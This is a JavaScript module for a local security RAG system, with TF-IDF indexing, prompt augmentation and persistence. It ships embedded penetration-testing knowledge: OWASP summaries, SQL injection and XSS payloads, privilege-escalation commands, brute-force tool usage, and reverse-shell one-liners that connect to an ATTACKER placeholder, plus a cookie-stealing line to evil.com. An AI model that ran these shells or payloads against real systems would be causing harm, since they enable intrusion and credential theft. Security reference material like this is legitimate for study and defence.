"use strict";
// ================= Security RAG — domain-specific knowledge that makes any model a security expert =================
//
// HOW IT WORKS:
// 1. INGEST: Load security knowledge (CVEs, OWASP, tool docs, cheat sheets, attack patterns)
// 2. CHUNK: Split into retrievable pieces with metadata
// 3. INDEX: Build a searchable index using TF-IDF (no external vector DB needed)
// 4. RETRIEVE: On every query, find the most relevant knowledge chunks
// 5. AUGMENT: Inject retrieved knowledge into the prompt before the model sees it
//
// WHY THIS BEATS A BIGGER MODEL:
// GPT-OSS 120B has general knowledge but no specific CVE details, tool flags,
// or attack patterns. A 7B model + this RAG system beats 120B raw because it
// has the RIGHT knowledge at query time, not just more parameters.
//
// RUNS 100% LOCALLY — no API, no cloud, no data leaves your machine.

const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const RAG_DIR = ".nexus/rag";
const INDEX_FILE = "index.json";
const MAX_CHUNKS = 10000;

// ================= TEXT PROCESSING =================

function tokenize(text) {
  return String(text || "").toLowerCase()
    .replace(/[^a-z0-9\-_.\/]/g, " ")
    .split(/\s+/)
    .filter(w => w.length > 2 && !STOP_WORDS.has(w));
}

const STOP_WORDS = new Set([
  "the", "and", "for", "are", "but", "not", "you", "all", "can", "had",
  "her", "was", "one", "our", "out", "has", "have", "been", "some", "them",
  "than", "its", "over", "such", "that", "this", "with", "will", "each",
  "make", "from", "they", "does", "into", "more", "when", "very", "what",
  "how", "who", "may", "use", "also", "any", "should", "which", "their",
]);

function chunkText(text, maxChunkSize, overlap) {
  maxChunkSize = maxChunkSize || 500;
  overlap = overlap || 50;
  const words = text.split(/\s+/);
  const chunks = [];
  for (let i = 0; i < words.length; i += maxChunkSize - overlap) {
    const chunk = words.slice(i, i + maxChunkSize).join(" ");
    if (chunk.trim().length > 20) chunks.push(chunk);
  }
  return chunks;
}

// ================= TF-IDF INDEX (no external dependencies) =================

class TFIDFIndex {
  constructor() {
    this.documents = [];    // { id, content, tokens, metadata }
    this.df = {};           // document frequency per term
    this.totalDocs = 0;
  }

  add(content, metadata) {
    const id = "doc_" + crypto.randomBytes(4).toString("hex");
    const tokens = tokenize(content);
    const tf = {};
    for (const t of tokens) tf[t] = (tf[t] || 0) + 1;

    // Update document frequencies
    const seen = new Set(tokens);
    for (const t of seen) this.df[t] = (this.df[t] || 0) + 1;

    this.documents.push({ id, content, tokens, tf, metadata: metadata || {} });
    this.totalDocs++;
    return id;
  }

  // TF-IDF score for a query against a document
  _score(queryTokens, doc) {
    let score = 0;
    for (const qt of queryTokens) {
      const tf = (doc.tf[qt] || 0) / Math.max(doc.tokens.length, 1);
      const idf = Math.log((this.totalDocs + 1) / ((this.df[qt] || 0) + 1)) + 1;
      score += tf * idf;
    }
    // Boost by metadata relevance
    if (doc.metadata.category) {
      for (const qt of queryTokens) {
        if (doc.metadata.category.toLowerCase().includes(qt)) score *= 1.5;
      }
    }
    return score;
  }

  search(query, topK) {
    topK = topK || 5;
    const queryTokens = tokenize(query);
    if (!queryTokens.length) return [];

    const scored = this.documents.map(doc => ({
      id: doc.id,
      content: doc.content,
      metadata: doc.metadata,
      score: this._score(queryTokens, doc),
    }));

    return scored
      .filter(s => s.score > 0)
      .sort((a, b) => b.score - a.score)
      .slice(0, topK);
  }

  stats() {
    return {
      documents: this.totalDocs,
      uniqueTerms: Object.keys(this.df).length,
      avgDocLength: this.totalDocs ? Math.round(this.documents.reduce((s, d) => s + d.tokens.length, 0) / this.totalDocs) : 0,
    };
  }
}

// ================= BUILT-IN SECURITY KNOWLEDGE =================
// Pre-loaded knowledge that ships with Darknode — no downloads needed.

const BUILTIN_KNOWLEDGE = {
  owasp_top_10: [
    { title: "A01: Broken Access Control", content: "Broken Access Control: Failures in enforcing user permissions. Attackers access unauthorized functions or data. Common issues: IDOR (Insecure Direct Object Reference) — changing /api/user/123 to /api/user/124 to access another user's data. Missing function-level access control — admin endpoints accessible to regular users. CORS misconfiguration allowing unauthorized origins. Fix: deny by default, implement RBAC, validate ownership on every request, disable directory listing, log access control failures.", category: "vulnerability" },
    { title: "A02: Cryptographic Failures", content: "Cryptographic Failures: Sensitive data exposed due to weak or missing encryption. Transmitting data in cleartext (HTTP, FTP, SMTP). Using deprecated algorithms (MD5, SHA1, DES, RC4). Hardcoded encryption keys in source code. Missing TLS on login/payment pages. Fix: classify data by sensitivity, encrypt all sensitive data at rest and in transit, use strong algorithms (AES-256, RSA-2048+, SHA-256+), don't cache sensitive responses, enforce HSTS.", category: "vulnerability" },
    { title: "A03: Injection", content: "Injection: Untrusted data sent to an interpreter as part of a command or query. SQL injection: ' OR 1=1 -- in login form bypasses authentication. SELECT * FROM users WHERE name='' OR 1=1 --'. Command injection: user input in system() or exec() allows arbitrary command execution. OS command: ; cat /etc/passwd. XSS (Cross-Site Scripting): <script>document.cookie</script> injected into a page steals session tokens. Fix: use parameterized queries (prepared statements), validate/sanitize all input, escape output, use ORM, apply CSP headers.", category: "vulnerability" },
    { title: "A04: Insecure Design", content: "Insecure Design: Missing or ineffective security controls in the design phase. Not threat modeling before building. No rate limiting on authentication endpoints allows credential stuffing. No account lockout after failed attempts. Missing CAPTCHA on public forms. Fix: use secure design patterns, threat model with STRIDE, establish secure development lifecycle, use reference architectures, implement defense in depth.", category: "vulnerability" },
    { title: "A05: Security Misconfiguration", content: "Security Misconfiguration: Insecure default configurations, incomplete setups, open cloud storage, unnecessary features enabled. Default credentials left in place (admin/admin). Unnecessary services running (directory listing, debug mode). Stack traces shown to users exposing internals. Missing security headers (CSP, HSTS, X-Frame-Options). S3 buckets with public access. Fix: hardened baseline config, remove unused features, automated config scanning, segmented architecture, send security directives to clients (headers).", category: "vulnerability" },
    { title: "A06: Vulnerable Components", content: "Vulnerable and Outdated Components: Using libraries/frameworks with known vulnerabilities. Running outdated software (Apache Struts, Log4j 2.x < 2.17). Not tracking component versions. Not monitoring CVE databases for dependencies. Fix: remove unused dependencies, continuously inventory versions, monitor CVE sources (NVD, GitHub Advisories), prefer maintained components, subscribe to security bulletins. Tools: npm audit, pip audit, Snyk, Dependabot, OWASP Dependency-Check.", category: "vulnerability" },
    { title: "A07: Authentication Failures", content: "Identification and Authentication Failures: Weak authentication mechanisms. Permitting brute force attacks (no rate limiting, no lockout). Allowing weak passwords (123456, password). Storing passwords in plain text or with weak hashing (MD5). Missing MFA. Session tokens in URL. Session not invalidated on logout. Fix: implement MFA, don't ship default credentials, check passwords against breached password lists, use bcrypt/scrypt/argon2 for hashing, limit failed login attempts, use secure session management.", category: "vulnerability" },
    { title: "A08: Software Integrity", content: "Software and Data Integrity Failures: Code and infrastructure that doesn't protect against integrity violations. CI/CD pipeline without verification — an attacker modifies build artifacts. Auto-update without signature verification. Insecure deserialization — attacker sends crafted serialized object for RCE. Using CDN resources without Subresource Integrity (SRI). Fix: use digital signatures, verify checksums, use SRI for CDN scripts, use signed commits, review code changes, don't deserialize untrusted data.", category: "vulnerability" },
    { title: "A09: Logging Failures", content: "Security Logging and Monitoring Failures: Insufficient logging of security events. Login failures not logged — can't detect brute force. Logs stored only locally and lost on compromise. No alerting on suspicious activity. Penetration tests don't trigger alerts. Fix: log all authentication events (success + failure), log access control failures, log input validation failures, ensure logs have enough context for forensics, implement alerting for anomalies, establish incident response plan.", category: "vulnerability" },
    { title: "A10: SSRF", content: "Server-Side Request Forgery (SSRF): Application fetches a remote resource based on user-supplied URL without validation. Attacker provides: http://169.254.169.254/latest/meta-data/ to access AWS metadata. http://localhost:6379/ to interact with internal Redis. file:///etc/passwd to read local files. Bypasses: URL shorteners, DNS rebinding, IPv6 addresses, decimal IP encoding. Fix: sanitize and validate all user-supplied URLs, use allowlists for permitted domains, disable HTTP redirects, don't send raw responses to clients, segment remote resource access.", category: "vulnerability" },
  ],

  common_ports: [
    { title: "Common Ports Reference", content: "Common ports in penetration testing: 21 FTP (file transfer, anonymous login check), 22 SSH (secure shell, brute force with hydra), 23 Telnet (unencrypted remote access), 25 SMTP (email, open relay check), 53 DNS (zone transfer with dig axfr), 80 HTTP (web server, directory brute with gobuster), 110 POP3 (email retrieval), 111 RPCbind (NFS enumeration), 135 MSRPC (Windows RPC), 139/445 SMB (Windows file sharing, enum4linux, smbclient), 143 IMAP (email), 443 HTTPS (SSL/TLS web), 993 IMAPS, 995 POP3S, 1433 MSSQL (SQL Server), 1521 Oracle DB, 2049 NFS, 3306 MySQL, 3389 RDP (Remote Desktop), 5432 PostgreSQL, 5900 VNC, 5985/5986 WinRM, 6379 Redis, 8080 HTTP-Alt (proxy, Jenkins, Tomcat), 8443 HTTPS-Alt, 9090 Management, 27017 MongoDB.", category: "reference" },
  ],

  attack_patterns: [
    { title: "SQL Injection Patterns", content: "SQL Injection attack patterns and payloads: Authentication bypass: ' OR 1=1 --, ' OR '1'='1, admin'--. Union-based: ' UNION SELECT null,username,password FROM users--. Error-based: ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--. Blind boolean: ' AND 1=1-- (true), ' AND 1=2-- (false). Blind time-based: ' AND SLEEP(5)--. Tools: sqlmap -u 'http://target/page?id=1' --dbs --batch. Prevention: parameterized queries, prepared statements, ORM, input validation, WAF.", category: "attack" },
    { title: "XSS Patterns", content: "Cross-Site Scripting (XSS) attack patterns: Reflected XSS: <script>alert(1)</script> in URL parameter. Stored XSS: <img src=x onerror=alert(1)> in forum post. DOM XSS: document.location='http://evil.com/?c='+document.cookie. Filter bypass: <ScRiPt>alert(1)</ScRiPt>, <img/src=x onerror=alert(1)>, javascript:alert(1), <svg onload=alert(1)>. Polyglot: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//. Prevention: output encoding, CSP header, HttpOnly cookies, DOMPurify for sanitization.", category: "attack" },
    { title: "Privilege Escalation Linux", content: "Linux privilege escalation techniques: SUID binaries: find / -perm -4000 -type f 2>/dev/null. Check sudo rights: sudo -l. Writable /etc/passwd: openssl passwd -1 -salt xyz password, add to /etc/passwd. Kernel exploits: uname -a, searchsploit linux kernel <version>. Cron jobs: cat /etc/crontab, ls -la /etc/cron.d/. PATH hijacking: echo $PATH, create malicious binary in writable PATH directory. Capabilities: getcap -r / 2>/dev/null. Docker escape: if in docker group, mount host filesystem. Tools: LinPEAS, LinEnum, linux-exploit-suggester.", category: "attack" },
    { title: "Privilege Escalation Windows", content: "Windows privilege escalation techniques: Check privileges: whoami /priv. Unquoted service paths: wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v 'C:\\Windows'. AlwaysInstallElevated: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated. Stored credentials: cmdkey /list, runas /savecred /user:admin cmd. Token impersonation: incognito module in Meterpreter. Scheduled tasks: schtasks /query /fo LIST. Tools: WinPEAS, PowerUp, Seatbelt, SharpUp.", category: "attack" },
    { title: "Reverse Shell Cheat Sheet", content: "Reverse shell one-liners: Bash: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1. Python: python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"ATTACKER\",PORT));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'. PHP: php -r '$s=fsockopen(\"ATTACKER\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'. Netcat: nc -e /bin/sh ATTACKER PORT. PowerShell: $c=New-Object Net.Sockets.TCPClient('ATTACKER',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}. Listener: nc -lvnp PORT.", category: "attack" },
  ],

  tools: [
    { title: "Nmap Cheat Sheet", content: "Nmap scanning: Basic scan: nmap TARGET. Service version: nmap -sV TARGET. OS detection: nmap -O TARGET. Aggressive: nmap -A TARGET. All ports: nmap -p- TARGET. Fast scan: nmap -F TARGET. UDP scan: nmap -sU TARGET. Script scan: nmap -sC TARGET. Specific ports: nmap -p 80,443,8080 TARGET. Output: nmap -oN output.txt TARGET. Stealth SYN: nmap -sS TARGET. Timing: nmap -T4 TARGET (faster), -T1 (slower/stealthier). Top ports: nmap --top-ports 1000 TARGET. Vulnerability scripts: nmap --script vuln TARGET. HTTP enum: nmap --script http-enum TARGET.", category: "tool" },
    { title: "SQLMap Cheat Sheet", content: "SQLMap automated SQL injection: Basic test: sqlmap -u 'http://target/page?id=1'. With cookie: sqlmap -u URL --cookie='PHPSESSID=abc'. POST data: sqlmap -u URL --data='user=admin&pass=test'. List databases: sqlmap -u URL --dbs. List tables: sqlmap -u URL -D dbname --tables. Dump table: sqlmap -u URL -D dbname -T tablename --dump. OS shell: sqlmap -u URL --os-shell. Tamper scripts: sqlmap -u URL --tamper=space2comment. Batch mode: sqlmap -u URL --batch. Risk/level: sqlmap -u URL --risk=3 --level=5. Through proxy: sqlmap -u URL --proxy=http://127.0.0.1:8080.", category: "tool" },
    { title: "Hydra Cheat Sheet", content: "Hydra brute force: SSH: hydra -l admin -P wordlist.txt TARGET ssh. FTP: hydra -l admin -P wordlist.txt TARGET ftp. HTTP POST form: hydra -l admin -P wordlist.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'. HTTP Basic Auth: hydra -l admin -P wordlist.txt TARGET http-get /admin. RDP: hydra -l admin -P wordlist.txt TARGET rdp. MySQL: hydra -l root -P wordlist.txt TARGET mysql. SMB: hydra -l admin -P wordlist.txt TARGET smb. Specify port: hydra -s 2222 -l admin -P wordlist.txt TARGET ssh. Verbose: hydra -V -l admin -P wordlist.txt TARGET ssh.", category: "tool" },
    { title: "Gobuster Cheat Sheet", content: "Gobuster directory/DNS brute force: Directory scan: gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt. With extensions: gobuster dir -u http://TARGET -w wordlist.txt -x php,html,txt. DNS subdomain: gobuster dns -d TARGET -w subdomains.txt. VHOST: gobuster vhost -u http://TARGET -w wordlist.txt. Threads: gobuster dir -u URL -w wordlist.txt -t 50. Status codes: gobuster dir -u URL -w wordlist.txt -s 200,301,302. Output: gobuster dir -u URL -w wordlist.txt -o results.txt. Follow redirects: gobuster dir -u URL -w wordlist.txt -r.", category: "tool" },
  ],
};

// ================= RAG SYSTEM =================

class SecurityRAG {
  constructor() {
    this.index = new TFIDFIndex();
    this.loaded = false;
  }

  // Load built-in security knowledge
  loadBuiltins() {
    for (const [category, items] of Object.entries(BUILTIN_KNOWLEDGE)) {
      for (const item of items) {
        // Chunk large items
        const chunks = chunkText(item.content, 300, 30);
        for (const chunk of chunks) {
          this.index.add(chunk, { title: item.title, category: item.category || category, source: "builtin" });
        }
      }
    }
    this.loaded = true;
  }

  // Ingest a custom knowledge file (markdown, text, JSON)
  ingestFile(filePath) {
    const content = fs.readFileSync(filePath, "utf8");
    const ext = path.extname(filePath).toLowerCase();
    const filename = path.basename(filePath);

    if (ext === ".json") {
      try {
        const data = JSON.parse(content);
        const items = Array.isArray(data) ? data : [data];
        for (const item of items) {
          const text = item.content || item.text || item.description || JSON.stringify(item);
          this.index.add(text, { title: item.title || filename, category: item.category || "custom", source: filePath });
        }
      } catch (_) {
        this.index.add(content, { title: filename, category: "custom", source: filePath });
      }
    } else {
      // Markdown or plain text — split by headers or paragraphs
      const sections = content.split(/\n#{1,3}\s+/).filter(s => s.trim().length > 20);
      if (sections.length > 1) {
        for (const section of sections) {
          const chunks = chunkText(section, 300, 30);
          for (const chunk of chunks) {
            this.index.add(chunk, { title: filename, category: "custom", source: filePath });
          }
        }
      } else {
        const chunks = chunkText(content, 300, 30);
        for (const chunk of chunks) {
          this.index.add(chunk, { title: filename, category: "custom", source: filePath });
        }
      }
    }
  }

  // Ingest an entire directory of knowledge files
  ingestDirectory(dirPath) {
    let count = 0;
    try {
      const files = fs.readdirSync(dirPath).filter(f => /\.(md|txt|json)$/.test(f));
      for (const f of files) {
        this.ingestFile(path.join(dirPath, f));
        count++;
      }
    } catch (_) {}
    return count;
  }

  // Retrieve relevant knowledge for a query
  retrieve(query, topK) {
    if (!this.loaded) this.loadBuiltins();
    return this.index.search(query, topK || 5);
  }

  // Augment a prompt with retrieved knowledge
  augment(prompt, topK) {
    const results = this.retrieve(prompt, topK || 5);
    if (!results.length) return prompt;

    const knowledge = results.map((r, i) =>
      `[Source ${i + 1}: ${r.metadata.title || "Unknown"} (${r.metadata.category})]:\n${r.content}`
    ).join("\n\n");

    return [
      "## Relevant Security Knowledge (auto-retrieved)",
      "",
      knowledge,
      "",
      "## Your Task",
      "",
      prompt,
      "",
      "Use the security knowledge above to inform your answer. Cite specific techniques, tools, or CVEs when relevant.",
    ].join("\n");
  }

  // Build the AI prompt with RAG context
  buildPrompt(userQuery, systemPrompt) {
    const results = this.retrieve(userQuery, 5);
    const context = results.map(r => r.content).join("\n\n");

    return {
      system: (systemPrompt || "You are a cybersecurity expert.") +
        (context ? "\n\n## Reference Knowledge\n\n" + context : ""),
      user: userQuery,
      sources: results.map(r => ({ title: r.metadata.title, category: r.metadata.category, score: r.score.toFixed(3) })),
    };
  }

  // Persistence
  save(cwd) {
    const dir = path.join(cwd, RAG_DIR);
    fs.mkdirSync(dir, { recursive: true });
    const data = { documents: this.index.documents.map(d => ({ content: d.content, metadata: d.metadata })), savedAt: Date.now() };
    fs.writeFileSync(path.join(dir, INDEX_FILE), JSON.stringify(data));
  }

  load(cwd) {
    try {
      const data = JSON.parse(fs.readFileSync(path.join(cwd, RAG_DIR, INDEX_FILE), "utf8"));
      this.index = new TFIDFIndex();
      for (const doc of data.documents) this.index.add(doc.content, doc.metadata);
      this.loaded = true;
      return true;
    } catch (_) { return false; }
  }

  stats() {
    return { ...this.index.stats(), loaded: this.loaded, builtinCategories: Object.keys(BUILTIN_KNOWLEDGE).length };
  }
}

module.exports = { SecurityRAG, TFIDFIndex, chunkText, tokenize, BUILTIN_KNOWLEDGE };
